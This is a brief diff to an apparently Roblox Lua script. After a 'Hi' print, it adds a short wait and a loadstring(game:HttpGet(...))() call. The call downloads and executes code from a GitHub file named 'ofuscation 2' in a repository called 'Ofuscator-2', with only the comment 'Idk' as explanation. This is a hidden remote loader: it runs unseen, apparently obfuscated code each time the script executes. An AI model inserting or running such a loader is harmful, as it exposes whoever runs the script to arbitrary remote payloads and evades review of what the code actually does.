@@ -887,4 +887,9 @@ end)
 
 print("Hi")
 
+-- Esperar 0.3 segundos
+task.wait(0.3)
+
+-- Idk 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bot248480-eng/Ofuscator-2/refs/heads/main/ofuscation%202"))()
 
